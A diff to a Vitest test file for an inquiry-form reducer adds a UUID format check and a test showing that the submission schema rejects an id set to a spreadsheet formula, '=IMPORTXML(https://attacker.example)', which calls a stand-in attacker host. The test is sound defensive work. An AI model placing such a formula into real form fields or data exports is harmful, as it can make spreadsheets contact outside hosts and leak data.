@@ -2,6 +2,7 @@ import { describe, expect, it } from "vitest"
 
 import {
   createInquiryState,
+  inquirySubmissionSchema,
   inquiryReducer,
   inquirySteps,
   toInquirySubmission,
@@ -41,6 +42,9 @@ describe("inquiryReducer", () => {
     }
 
     expect(state.status).toBe("submitting")
+    expect(state.id).toMatch(
+      /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/
+    )
     expect(toInquirySubmission(state)).toEqual({
       id: expect.any(String),
       type: "hire",
@@ -117,5 +121,18 @@ describe("inquiryReducer", () => {
     expect(toInquirySubmission(state).context).toBe(
       "https://example.com/jobs/technical-lead"
     )
+  })
+
+  it("accepts only UUID inquiry identifiers", () => {
+    expect(() =>
+      inquirySubmissionSchema.parse({
+        id: "=IMPORTXML(https://attacker.example)",
+        type: "hire",
+        name: "Amina Rahman",
+        email: "amina@example.com",
+        role: "Senior Frontend Engineer",
+        arrangement: "Remote",
+      })
+    ).toThrow()
   })
 })
